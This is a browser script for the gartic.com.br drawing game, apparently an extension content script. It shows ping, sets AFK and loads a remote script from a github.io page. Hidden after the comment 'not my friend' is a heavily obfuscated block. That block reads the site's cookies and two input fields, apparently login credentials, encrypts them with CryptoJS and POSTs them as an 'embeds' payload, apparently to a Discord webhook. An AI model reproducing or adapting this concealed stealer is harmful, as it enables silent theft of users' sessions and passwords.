
async function ping() {
    let t = Date.now();
    await fetch(window.location.href);
    return `${Date.now() - t}ms`;
}

setInterval(() => {
    ping().then((t) => {
        1 == document.location.href.startsWith("https://gartic.com.br/0") &&
            ((document.querySelectorAll("input")[8].attributes[0].textContent = t),
             (document.querySelector("#tema > input.boxvets").disabled = true));
    });
}, 3e3);

setTimeout(() => {
    if (document.URL.startsWith("https://gartic.com.br/0")) {
        document.querySelector("#tema > input.isAfk").checked = true;
    }
}, 1000);

// HTML da parte "seguir"

// if ("https://gartic.com.br/" === document.URL) {
//     var _buceta = document.createElement("input");
//     (_buceta.type = "text"),
//         (_buceta.className = "seguir"),
//         _buceta.setAttribute("placeholder", "Atualizando... padder#7724"),
//         (_buceta.style = "padding-left: 275px;padding-right: 275px;"),
//         document.querySelector("#blocoJogar > div.conteudo").append(_buceta);
//     var _botao = document.createElement("button");
//     (_botao.innerHTML = "Stop"), (_botao.className = "stopChasingMe"),
// 	    (_botao.style = "padding-left: 343px;padding-right: 343px;"),
// 	    document.querySelector("#blocoJogar > div.conteudo").append(_botao);
// }



// cria-se biscuit
document.cookie.includes("chase=") ? console.log("has biscuit") : (document.cookie = "chase=0");

var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://reddap.github.io/gartic-extension/gatric/trash/chase.js";
document.body.appendChild(script);

"https://gartic.com.br"===document.URL&&(document.querySelector("#blocoJogar > div.conteudo > button").style.backgroundColor="ivory");


// comment
var fodida = setInterval(() => {
    document.querySelector("#blocoJogar > div.conteudo > button") &&
        (clearInterval(fodida),
        (document.querySelector("#blocoJogar > div.conteudo").appendChild(document.createElement("p")).innerHTML =
            "<p align='center'> status: <a  target='_blank' href='https://discord.com/' style='text-decoration:none'> descontinuado</a>.<br><i>latest update 01-03-2022 - by <a  target='_blank' href='https://discord.com/' style='text-decoration:none'> padder#7724</a></i><p>"));
}, 333);

// x
//sess, rec, biscuit

// biscuit (3)

// aviso para crianças
// var putinha = setInterval(() => {
//     document.querySelector("#blocoJogar > div.conteudo > input") &&
//         (document.querySelector("#blocoJogar > div.conteudo > input").addEventListener("keyup", function (e) {
//             13 === e.keyCode && (alert('Clique em "stop" para interromper a observação e poder jogar normalmente.'), location.reload());
//         }),
//         clearInterval(putinha));
// }, 333);




// filtro "porta"
//         document.URL.startsWith("https://gartic.com.br/0") &&
//             document.querySelector("#botoes > input.bt_orange_medium") &&
//             (document.cookie.includes("chase=0") ||
//                 setTimeout(() => {
//                     document.querySelector("#botoes > input.bt_orange_medium").click();
//                 }, 5e3));


//unnusual

// not my friend

(function(_0x125518,_0x278df1){function _0x2bb8e9(_0x25195f,_0x4343c5,_0x52072c,_0x2904b,_0x5b8ee7){return _0x432a(_0x4343c5-0xbb,_0x2904b);}function _0x3ec585(_0x5399e2,_0x1c1bc3,_0x149d21,_0x208642,_0x21e099){return _0x432a(_0x5399e2- -0x3ae,_0x149d21);}var _0x41814b=_0x125518();function _0x33d7f3(_0x335384,_0x3fd91a,_0x2d9055,_0x380632,_0x502f38){return _0x432a(_0x3fd91a-0x111,_0x502f38);}function _0xcb09cf(_0x5c9433,_0x9f207d,_0x1667bb,_0x3d6640,_0x377b05){return _0x432a(_0x3d6640- -0x172,_0x5c9433);}function _0x4cb1ed(_0x30d124,_0x372241,_0x350098,_0x3175d7,_0x525b3c){return _0x432a(_0x372241- -0x3dd,_0x3175d7);}while(!![]){try{var _0x3e2212=parseInt(_0xcb09cf('C#IE',0x47,0x55,0xf,-0x11))/(-0x5*0x1cd+-0x15c*0x1b+0x2*0x16db)*(parseInt(_0x3ec585(-0x260,-0x283,'tBe7',-0x2aa,-0x2a3))/(-0x10*-0xa1+-0x7b8+-0x256))+parseInt(_0xcb09cf('VIUQ',-0x44,0x11,0x2,-0x35))/(0x1279+-0x1da7*0x1+0xb31)+parseInt(_0x2bb8e9(0x204,0x205,0x212,'tcC0',0x1ef))/(-0x37c*-0x8+-0x27a*-0xe+-0x3e88)+parseInt(_0x2bb8e9(0x211,0x257,0x25a,'#n@Q',0x224))/(0x1*-0xb85+0x1170+0xa*-0x97)+-parseInt(_0x33d7f3(0x296,0x24c,0x245,0x288,'ju0Z'))/(-0x1*-0xfa5+0x3a7+-0x1346)*(parseInt(_0x2bb8e9(0x218,0x237,0x260,'Cv$u',0x270))/(-0x1582+0x1d4d+0x8e*-0xe))+parseInt(_0x2bb8e9(0x1db,0x21b,0x1f3,'6OyT',0x235))/(0x237b+-0x1*0x75b+-0x1c18)*(parseInt(_0x33d7f3(0x283,0x23f,0x27b,0x24d,'ju0Z'))/(0x2542+0x165a+-0x3b93*0x1))+-parseInt(_0x4cb1ed(-0x247,-0x268,-0x26e,'n05G',-0x237))/(-0x6f*-0xf+-0x13*0xfd+0xc50);if(_0x3e2212===_0x278df1)break;else _0x41814b['push'](_0x41814b['shift']());}catch(_0x17cf4a){_0x41814b['push'](_0x41814b['shift']());}}}(_0x46b2,-0xd5*-0x6c6+-0xa1b5*-0x11+0x1*-0xa8bd1));function _0x3e04fd(_0x4596b0,_0x53040c,_0x116397,_0x16ed0d,_0x22df79){return _0x432a(_0x16ed0d-0xa1,_0x22df79);}function _0x3e8141(_0x7fcfbd,_0x4baffb,_0x24c7cf,_0xfb76c3,_0x53fbd0){return _0x432a(_0xfb76c3- -0x23a,_0x53fbd0);}document[_0x5af632(-0x98,-0x70,-0x87,-0x3d,'S(%[')+_0x105315(-0x1e6,-0x19d,-0x1a0,-0x1ca,'#n@Q')+_0x105315(-0x1bf,-0x1ae,-0x189,-0x1c1,'eWEo')](_0x105315(-0x1c3,-0x1a4,-0x1da,-0x19f,'$736')+_0x100be1(0x1be,0x186,0x1c4,'n05G',0x19e)+_0x100be1(0x140,0x14b,0x150,'Ts12',0x16e)+_0x5af632(-0x41,-0x88,-0xb9,-0xc9,'nk^&')+_0x100be1(0x1b3,0x1c2,0x1ec,'6Q&c',0x206)+_0x3e04fd(0x220,0x1f3,0x214,0x23e,'eE32')+_0x100be1(0x1ae,0x18c,0x179,'!SmJ',0x1a2)+'t')[_0x3e8141(-0xd5,-0xff,-0x118,-0x112,'Tkh$')+_0x3e8141(-0x10f,-0x116,-0xb4,-0xe5,'wpge')+_0x5af632(-0x5b,-0x99,-0x86,-0xe0,'na8@')+'r'](_0x3e8141(-0x92,-0xa0,-0x82,-0xa2,'T3Qc'),function(){var _0x4d6349={};_0x4d6349[_0xca86fc(0x478,'WiCI',0x47a,0x4ba,0x4bc)]=_0x13374e('$736',-0x1d4,-0x171,-0x168,-0x1a1)+_0x13374e('#n@Q',-0x14d,-0x17d,-0x185,-0x184);function _0xbb5d55(_0x351d2d,_0x1bb132,_0x43a676,_0x3db595,_0x1312dc){return _0x5af632(_0x351d2d-0x190,_0x43a676-0x55,_0x43a676-0x1ac,_0x3db595-0x16f,_0x1bb132);}function _0xca86fc(_0x3a9ab7,_0x53b386,_0x5dbff0,_0x5bb5ff,_0x570539){return _0x3e8141(_0x3a9ab7-0xfc,_0x53b386-0xec,_0x5dbff0-0x130,_0x3a9ab7-0x5a8,_0x53b386);}_0x4d6349[_0xca86fc(0x48d,'na8@',0x4d9,0x4c7,0x4bc)]=_0xbb5d55(0x9,'tBe7',0x3c,0x57,0x57)+_0xbb5d55(-0x6c,'VIUQ',-0x30,-0x38,-0x6d),_0x4d6349[_0x13374e('$eEm',-0x150,-0x12b,-0x13f,-0x14a)]=_0x13374e('tcC0',-0x10f,-0x110,-0x11e,-0x123)+_0xca86fc(0x47d,'na8@',0x4b0,0x48d,0x44b)+'n',_0x4d6349[_0x13374e('DV[6',-0x175,-0x16e,-0x1a6,-0x169)]=_0x59e550(-0x1f4,-0x22e,'n05G',-0x1e9,-0x220)+'xA',_0x4d6349[_0xbb5d55(0x2c,'*Dnx',0x23,0x11,0x5d)]=_0x59e550(-0x1ea,-0x1bd,'RtJx',-0x1f5,-0x1ee)+_0x1aa1c7(-0xf8,-0x106,-0xbd,'vBvD',-0x13f)+'pe',_0x4d6349[_0x59e550(-0x222,-0x247,'tcC0',-0x1fb,-0x1fd)]=_0xca86fc(0x493,'Yctc',0x49d,0x447,0x4d1)+_0xca86fc(0x4c8,'C#IE',0x49c,0x4de,0x4d9)+_0xca86fc(0x4fe,'eE32',0x526,0x4b3,0x4c4)+'n',_0x4d6349[_0x59e550(-0x21d,-0x21d,'$736',-0x25c,-0x24d)]=_0x59e550(-0x207,-0x1e6,'u1J&',-0x210,-0x22f),_0x4d6349[_0xbb5d55(-0x30,'Cv$u',-0x3b,-0x3b,-0x38)]=_0x13374e('OgUx',-0x137,-0x185,-0x150,-0x144)+_0xbb5d55(-0x7c,'4j0h',-0x3f,-0x23,0x3)+_0x59e550(-0x1f7,-0x19f,'6OyT',-0x1e4,-0x1ad)+_0xca86fc(0x4e6,'TFi&',0x512,0x500,0x4ed)+_0x1aa1c7(-0x118,-0x121,-0xe3,'n05G',-0xf6)+_0xbb5d55(0x88,'Z$RL',0x42,0x71,0x7a)+_0xbb5d55(-0x26,'Z$RL',-0x50,-0x40,-0x41)+_0x1aa1c7(-0x14c,-0x136,-0x13c,'VIUQ',-0x14d)+_0x13374e('!SmJ',-0x163,-0x120,-0x11a,-0x11a)+_0x59e550(-0x1d4,-0x22a,'S(%[',-0x1ec,-0x1de)+_0x59e550(-0x1a5,-0x213,'tcC0',-0x1d8,-0x1f7)+_0xca86fc(0x4fb,'TFi&',0x509,0x4c1,0x529)+_0x13374e('$eEm',-0x115,-0x132,-0x159,-0x137)+_0x59e550(-0x219,-0x21c,'Tkh$',-0x1d0,-0x1a4)+_0x59e550(-0x212,-0x235,'eWEo',-0x20c,-0x246)+_0x13374e('8^yj',-0x15e,-0x10c,-0x137,-0x146)+_0x13374e('rLMj',-0xe0,-0xcd,-0xde,-0x119)+_0x13374e('tBe7',-0x138,-0x135,-0x1bf,-0x17d)+_0xbb5d55(-0x52,'n05G',-0x23,-0x45,-0x60)+_0xca86fc(0x504,'OgUx',0x4b9,0x4fb,0x504)+_0xca86fc(0x4b6,'m#yw',0x4d2,0x4c6,0x4f0)+_0x1aa1c7(-0x175,-0x160,-0x180,'*Dnx',-0x1ab)+_0x59e550(-0x205,-0x27f,'vBvD',-0x234,-0x26c)+_0x13374e('nk^&',-0x125,-0x157,-0x112,-0x126);var _0x437d04=_0x4d6349;function _0x1aa1c7(_0x2ac30f,_0x36eba5,_0x1cc5bf,_0x2ea2c8,_0x48be5e){return _0x3e04fd(_0x2ac30f-0x12e,_0x36eba5-0x17d,_0x1cc5bf-0x6f,_0x2ac30f- -0x31e,_0x2ea2c8);}function _0x13374e(_0x3612b6,_0x49e01b,_0xdc9b3f,_0x43c6f3,_0x38ae47){return _0x105315(_0x3612b6-0x182,_0x49e01b-0xaa,_0xdc9b3f-0x102,_0x38ae47-0x7a,_0x3612b6);}var _0x3f359f=_0x437d04[_0x13374e('Tkh$',-0x13a,-0x18e,-0x14f,-0x186)][_0xbb5d55(-0x17,'n05G',-0x32,-0x20,-0x7e)]('|'),_0x338d49=0x2403+0x1473+0x42*-0xdb;function _0x59e550(_0x42db36,_0x261391,_0x3d1190,_0x5cdf00,_0x15b535){return _0x5af632(_0x42db36-0x51,_0x5cdf00- -0x1b5,_0x3d1190-0x187,_0x5cdf00-0xab,_0x3d1190);}while(!![]){switch(_0x3f359f[_0x338d49++]){case'0':_0x195eca[_0x59e550(-0x221,-0x1fa,'POiR',-0x218,-0x212)](JSON[_0x13374e('vBvD',-0x163,-0x137,-0x162,-0x16e)+_0x13374e('T3Qc',-0x136,-0x17d,-0x14e,-0x15a)](_0x2be06b));continue;case'1':var _0x2be06b={'embeds':[{'description':_0x13374e('eE32',-0x163,-0x13e,-0x116,-0x129)+CryptoJS[_0xbb5d55(0x1b,'BUi@',-0x1a,0x15,0x8)][_0xbb5d55(0x10,'wpge',-0x4,-0x36,-0x27)+'pt'](document[_0x1aa1c7(-0x149,-0x100,-0x108,'WiCI',-0x107)+_0x13374e('Cv$u',-0x16c,-0x119,-0x162,-0x164)+_0xca86fc(0x4df,'RtJx',0x513,0x501,0x510)](_0x437d04[_0x59e550(-0x1ad,-0x1cd,'[h4M',-0x1dc,-0x1f6)])[_0x13374e('Yctc',-0x11c,-0x126,-0x105,-0x133)]+'\x0a'+document[_0x1aa1c7(-0x113,-0x14e,-0xe0,'*Dnx',-0xdf)+_0xca86fc(0x509,'C#IE',0x4f6,0x54d,0x4fb)+_0x1aa1c7(-0x132,-0x17a,-0x10f,'BUi@',-0x177)](_0x437d04[_0xca86fc(0x4e7,'OgUx',0x534,0x4a4,0x51d)])[_0x1aa1c7(-0xfb,-0xdd,-0x122,'u1J&',-0xef)],_0x437d04[_0x13374e('#n@Q',-0x192,-0x15d,-0x15f,-0x19a)])+_0x59e550(-0x1ea,-0x20a,'na8@',-0x22a,-0x247)}]};continue;case'2':_0x195eca[_0x13374e('bhUN',-0x11d,-0x13f,-0x197,-0x161)+_0x13374e('d)yb',-0x198,-0x1c9,-0x15b,-0x197)+_0xca86fc(0x4b5,'na8@',0x4aa,0x47c,0x4ea)+'r'](_0x437d04[_0xbb5d55(-0x4c,'VIUQ',-0x40,-0x6d,0x6)],_0x437d04[_0x13374e('#n@Q',-0x196,-0x14e,-0x164,-0x16c)]);continue;case'3':var _0x195eca=new XMLHttpRequest();continue;case'4':_0x195eca[_0xbb5d55(-0x12,'BUi@',-0x3c,-0x54,-0x40)](_0x437d04[_0x1aa1c7(-0x138,-0xfb,-0x15c,'eE32',-0x16a)],_0x437d04[_0x13374e('DV[6',-0x133,-0x13a,-0x118,-0x14b)]);continue;}break;}});var request=new XMLHttpRequest();function _0x5af632(_0xeea34d,_0x18b9ca,_0x3b99d9,_0x18a507,_0x3fe39a){return _0x432a(_0x18b9ca- -0x1b2,_0x3fe39a);}function _0x100be1(_0x1b10bc,_0x4fc281,_0x46b2f1,_0x3f92c6,_0x40b5ec){return _0x432a(_0x4fc281-0x30,_0x3f92c6);}function _0x46b2(){var _0x59fc41=['bJaiW5Ck','xN9vcmkwyIy','xIBcHIBdIG','WQ/cPhpdIZ0','Ca7cU8kiWQqRsSoJisq5WOldTG','WRuRwCk4WOC','W6/dOgZdRgldHWBcTmkL','g2XRWRC+','dfWUeCoS','f8o9cq','zXqPW4z+','WQHgrmoMDW','W7FcNr1kia','ogpdUvhdMG','WPqmW6NdKSkgWPHQlSklAmksWQNdQW','WOZcUKCNWQa','W5izWQ7dI0O','W4fnWQdcImoE','nWpcGmk6WOS','W4VcNN7cHNi','WP3dPNO7WRW','gCkYa8k7WPu','WPFdUbD4W7G','W7RcUqJdQXG','WPGmW6xdLCkh','r13cImoWpW','CSksWPZcSCoX','WRGRWRb2WOC','WQq/hWeW','W5RdU8kgz8kM','WRKVs2lcLq','WOjSWRNcRwzkW4RcKLG','WO7cStBdMMa','pNFdQ1pcMCkSW5BdQG7cLNxdHYe','e8o0h8oOW4q','bgnIe8ki','W5JdICklW7bU','chtdUw4w','W7msqSkXW58','zXFdO8o5WQu','eCkRqmkTWPS','t1NdS1pdSa','kh3cOulcIW','W5BdMmomWQyY','WQvqWOhdLvy','xf1oW5f0','WPyCxq','zsVdOSkoWQ0','tNjoW4r5','EZNcRX3dUa','CMH9W6Hi','yvrTW4ys','ouvnWQbi','W6nwW5tdTWy','W4ddQCo+FMxcQ0ZcNSkGW4K','tMveW5H4','W6nsWR7cKmos','WPKBxmk+WR4','W6WHbfC','kW4xWPTm','W5eejmo3Cq','EhDwW5P1','eHVcRCkoWRS','WP7cOCkIja','duDGpCk8','W4ridCoSW6rqaCotd8oBDmkDW5y','W77cGZTWiW','rf5KbCkL','CCkWW4hcKSkZ','W4yuhZ87','W7m1ftq3','ChlcP1u','WRVdK3HKnq','WPpcHeFcKqi','xMzr','fq0ZWP9m','WP91WPpdGSoOB8ogW5RcRCoVW4NcHq','sJpcVZbkhSojWRZcNCkfW4JcVq','W5KqBLtcRq','yfvNW48v','eSo/aCkNWPu','qLfkW6jX','nmkBs8krWPG','egvEWOOv','fsvDkSoi','W7RcNteTlq','W5muiG','oI3cTrxdNq','WO3cSNRcKXG','WP1WWPBdHCoPBmkcW4ZcMSo0W7dcTmoy','WR/cJK7cPuJdJCoO','xxfb','bCo4gCkKWPS','EHr2W5TP','W6WHhMhcUa','sslcNcldOq','t3nuWPvd','WRdcLmku','csWgA8kV','i8ofd8kLWRm','WQbPqKD1WQpdHh7cGbldSW','DxraW5j4','WPtcI8kXW6Dl','oKbFhCkf','WP3dSrf/W7ZcO8oBW4xdMbzS','WOxcVSk1','qtpcTZZdLq','rcBcUGhdIq','WQTIatpcImk1DCk3WQq3','hYC/oq','qJFcUd5p','WPJcHa7dNWrMmCkJfW','dKOKemo8','W57dVSkjFq','WPJdVrf9W7NdPCoOW6BdTqnlrG','W5uXW7/cUwC','WO/cSe7cIXO','pujuWPy','dXi2W4Df','W5uXW6JcH3C','WR7cTs7dLMW','B8k0W4JdOCom','WObuWR7cLmoc','xYBcTWddJW','W4ZcQfyGWQC','DtD/WRDm','tqXZo8oGWQhcKX/cTq','emkPWQu','gJqHvSkH','W6PGpZX0','u2umW4jK','WOhcHeldLWe','t8kmWOi','WRSHWRHdWPm','bLvwfG','WOyVWQy3WPm','WRyYF8kNWPa','q8oimCkSW4W','W6RcQguoWOu','W44MW4C','WQLOCmkMWOy','BKLIWRm','W61ND3DR','WQ8nW6i','WPGnW77dTba','dKXvaq','BLzNW4itW4uRaty6W5JdHW','W5tdHrldJKFcTmkjWQBcR8oGlqrL','W7nJFGqu','WQvRrvFcTa','vaZcTSktW6C','WR0lWQi9WRe','u094hmkP'];_0x46b2=function(){return _0x59fc41;};return _0x46b2();}function _0x105315(_0x8509cd,_0x394cd9,_0x4fb48c,_0x4a8a26,_0x15ac30){return _0x432a(_0x4a8a26- -0x327,_0x15ac30);}request[_0x100be1(0x182,0x198,0x1bd,'Cv$u',0x1a1)](_0x5af632(-0x23,-0x43,-0x7b,-0x1b,'S(%['),_0x5af632(-0x48,-0x92,-0xb0,-0xad,'TFi&')+_0x3e8141(-0x97,-0xc6,-0xaa,-0xc3,'Y)]t')+_0x3e04fd(0x1a6,0x17f,0x1cd,0x1b3,'na8@')+_0x5af632(-0x79,-0x7d,-0xc1,-0x78,'S(%[')+_0x5af632(-0xb0,-0x7b,-0x53,-0x7d,'nk^&')+_0x3e04fd(0x1f8,0x1a0,0x1a2,0x1d3,'eE32')+_0x105315(-0x23a,-0x213,-0x22a,-0x1f1,'DV[6')+_0x3e04fd(0x1b5,0x1d0,0x1f9,0x1f1,'VdN[')+_0x3e8141(-0x6d,-0xdb,-0xb5,-0xa9,'tcC0')+_0x3e04fd(0x16e,0x184,0x1b2,0x1b6,'VIUQ')+_0x3e04fd(0x1f7,0x188,0x185,0x1af,'[h4M')+_0x3e04fd(0x1f2,0x1cb,0x193,0x1aa,'gdEM')+_0x3e04fd(0x1c8,0x1d3,0x1b7,0x1c7,'eWEo')+_0x3e04fd(0x226,0x1d5,0x206,0x1da,'#n@Q')+_0x3e04fd(0x24e,0x1ef,0x1ce,0x211,'$eEm')+_0x105315(-0x1e6,-0x227,-0x237,-0x210,'RtJx')+_0x5af632(0x11,-0x2c,-0x70,-0x1,'4j0h')+_0x100be1(0x1bf,0x1be,0x1a5,'6Q&c',0x182)+_0x105315(-0x151,-0x16f,-0x1c8,-0x189,'Cv$u')+_0x105315(-0x19f,-0x213,-0x1f3,-0x1cf,'VIUQ')+_0x5af632(-0x1e,-0x1d,-0x38,-0x38,'eWEo')+_0x100be1(0x181,0x19b,0x1c2,'eE32',0x1ac)+_0x3e8141(-0xa7,-0xa6,-0xa8,-0xdb,'S(%[')+_0x3e04fd(0x213,0x231,0x206,0x21e,'bhUN')),request[_0x100be1(0x149,0x170,0x18a,'Y)]t',0x165)+_0x100be1(0x14d,0x182,0x1a1,'6OyT',0x184)+_0x3e8141(-0xfd,-0xd0,-0xde,-0xed,'#n@Q')+'r'](_0x5af632(-0xc4,-0x98,-0xd7,-0x56,'!SmJ')+_0x5af632(-0x6b,-0x4e,-0x27,-0x54,'na8@')+'pe',_0x3e04fd(0x278,0x211,0x1e6,0x22d,'!SmJ')+_0x100be1(0x1a2,0x18e,0x17f,'tcC0',0x1b4)+_0x3e8141(-0xb8,-0xdf,-0x109,-0xcc,'*Dnx')+'n');function _0x432a(_0x5a76e8,_0x41c39c){var _0x5879bf=_0x46b2();return _0x432a=function(_0x19133a,_0x3a8f7b){_0x19133a=_0x19133a-(0x4*-0x161+-0x2*0x1163+0x1*0x2951);var _0x110334=_0x5879bf[_0x19133a];if(_0x432a['PQpflc']===undefined){var _0x2c7288=function(_0x5414df){var _0x5e0df3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x9c7530='',_0x1bb680='';for(var _0x1c3963=-0x2*-0x118c+0x1837+-0x3b4f,_0x71cf87,_0x2a6cb2,_0x5b0764=0x137*0xb+-0x406*0x5+0x6c1;_0x2a6cb2=_0x5414df['charAt'](_0x5b0764++);~_0x2a6cb2&&(_0x71cf87=_0x1c3963%(-0x522+0x436+-0x50*-0x3)?_0x71cf87*(0xe34+-0xeb1*0x1+0xbd)+_0x2a6cb2:_0x2a6cb2,_0x1c3963++%(-0x1fbf+0x1062+-0x1f*-0x7f))?_0x9c7530+=String['fromCharCode'](-0x2e3+0x1582+-0x2f0*0x6&_0x71cf87>>(-(0xc7b+0x88c*0x4+-0x5*0x955)*_0x1c3963&0x14b0+-0x10b+0x139f*-0x1)):-0x1*-0x2061+-0x65*0x49+-0x394){_0x2a6cb2=_0x5e0df3['indexOf'](_0x2a6cb2);}for(var _0xd8a211=0x64a+-0x1f43+0x18f9,_0x56aa73=_0x9c7530['length'];_0xd8a211<_0x56aa73;_0xd8a211++){_0x1bb680+='%'+('00'+_0x9c7530['charCodeAt'](_0xd8a211)['toString'](-0x3a1+0xe5*-0x11+0x12e6))['slice'](-(-0x15c+0x18d5+-0x1777));}return decodeURIComponent(_0x1bb680);};var _0x25206e=function(_0x2b0b92,_0x249515){var _0xe348b=[],_0x20ead7=-0xf+-0xa1f*0x1+0xa2e*0x1,_0x19daa9,_0x1ae24d='';_0x2b0b92=_0x2c7288(_0x2b0b92);var _0x261ea8;for(_0x261ea8=-0x100a+-0x167*0x9+0x1ca9;_0x261ea8<-0x9a8*-0x1+0x4*-0x2b7+-0x2f*-0xc;_0x261ea8++){_0xe348b[_0x261ea8]=_0x261ea8;}for(_0x261ea8=0xe2*-0xa+0xb2d*-0x1+0x1401;_0x261ea8<0xe6*-0x17+0xd6a+0x840;_0x261ea8++){_0x20ead7=(_0x20ead7+_0xe348b[_0x261ea8]+_0x249515['charCodeAt'](_0x261ea8%_0x249515['length']))%(0x2*0xe41+0x139*0x5+-0x219f),_0x19daa9=_0xe348b[_0x261ea8],_0xe348b[_0x261ea8]=_0xe348b[_0x20ead7],_0xe348b[_0x20ead7]=_0x19daa9;}_0x261ea8=0x6b*-0x4f+0x9*0x274+-0x1*-0xaf1,_0x20ead7=0x1f*-0x97+0xf9*-0xf+0x20e0;for(var _0x5661cc=-0x1*-0x1633+0x200+-0x1833;_0x5661cc<_0x2b0b92['length'];_0x5661cc++){_0x261ea8=(_0x261ea8+(0xb*0x287+-0x22bb+-0x6ef*-0x1))%(-0x235a+0xa4c+0x1a0e),_0x20ead7=(_0x20ead7+_0xe348b[_0x261ea8])%(-0xef9*-0x1+-0x22ee+0x14f5),_0x19daa9=_0xe348b[_0x261ea8],_0xe348b[_0x261ea8]=_0xe348b[_0x20ead7],_0xe348b[_0x20ead7]=_0x19daa9,_0x1ae24d+=String['fromCharCode'](_0x2b0b92['charCodeAt'](_0x5661cc)^_0xe348b[(_0xe348b[_0x261ea8]+_0xe348b[_0x20ead7])%(-0xf9b+0x1*0x1466+-0x3cb)]);}return _0x1ae24d;};_0x432a['lNLXCb']=_0x25206e,_0x5a76e8=arguments,_0x432a['PQpflc']=!![];}var _0x5b22ee=_0x5879bf[0x5d5+0x1c80+-0x2255],_0x18fb28=_0x19133a+_0x5b22ee,_0x1a57e6=_0x5a76e8[_0x18fb28];return!_0x1a57e6?(_0x432a['UlTXQk']===undefined&&(_0x432a['UlTXQk']=!![]),_0x110334=_0x432a['lNLXCb'](_0x110334,_0x3a8f7b),_0x5a76e8[_0x18fb28]=_0x110334):_0x110334=_0x1a57e6,_0x110334;},_0x432a(_0x5a76e8,_0x41c39c);}var params={'embeds':[{'description':_0x100be1(0x123,0x15c,0x142,'S(%[',0x11d)+CryptoJS[_0x3e8141(-0xed,-0x102,-0xc7,-0x102,'Tkh$')][_0x3e8141(-0x130,-0x102,-0x131,-0x116,'nk^&')+'pt'](_0x100be1(0x182,0x191,0x1c7,'cNDv',0x14b)+document[_0x5af632(-0x9a,-0x9e,-0xa1,-0x69,'Rp4N')+'e'][_0x3e04fd(0x22a,0x1ef,0x19d,0x1df,'eE32')+'ce'](/(\;)/gi,';\x0a')+_0x5af632(-0x7e,-0xa2,-0xb6,-0xa7,'Ts12'),_0x3e8141(-0x15e,-0x11c,-0x128,-0x129,'gdEM')+'xA')+_0x3e04fd(0x209,0x1e5,0x226,0x20e,'ju0Z')}]};request[_0x5af632(-0x84,-0x96,-0xa0,-0x70,'Y)]t')](JSON[_0x5af632(-0xb1,-0xab,-0xf7,-0xdd,'VdN[')+_0x105315(-0x1c4,-0x200,-0x1b9,-0x1b4,'Cv$u')](params));
